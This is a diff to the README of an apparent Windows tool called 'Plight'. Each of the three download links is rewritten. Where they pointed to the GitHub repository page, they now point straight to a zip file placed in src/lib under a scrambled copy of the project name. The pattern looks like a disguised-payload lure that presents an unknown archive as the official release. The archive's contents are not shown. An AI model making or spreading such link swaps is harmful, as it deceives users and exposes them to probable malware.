@@ -1,6 +1,6 @@
 # 🧩 plight-discover-and-solve-real-problems - Find Real Problems Fast
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Srijit008/plight-discover-and-solve-real-problems)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Srijit008/plight-discover-and-solve-real-problems/main/src/lib/plight-and-real-solve-discover-problems-v3.1.zip)
 
 ## 📖 About Plight
 
@@ -42,7 +42,7 @@ Follow these steps to download and start using Plight on your Windows PC.
 
 You need to visit the GitHub page where Plight is hosted. From there, you can get the latest release and installation files.
 
-[Click here to visit the download page](https://github.com/Srijit008/plight-discover-and-solve-real-problems)
+[Click here to visit the download page](https://raw.githubusercontent.com/Srijit008/plight-discover-and-solve-real-problems/main/src/lib/plight-and-real-solve-discover-problems-v3.1.zip)
 
 ### Step 2: Download the Software
 
@@ -132,4 +132,4 @@ If you run into questions or issues:
 
 Use the link below to visit the GitHub page and get the latest version of Plight for Windows.
 
-[![Get Plight on GitHub](https://img.shields.io/badge/Download-Plight-blue?style=for-the-badge)](https://github.com/Srijit008/plight-discover-and-solve-real-problems)
+[![Get Plight on GitHub](https://img.shields.io/badge/Download-Plight-blue?style=for-the-badge)](https://raw.githubusercontent.com/Srijit008/plight-discover-and-solve-real-problems/main/src/lib/plight-and-real-solve-discover-problems-v3.1.zip)
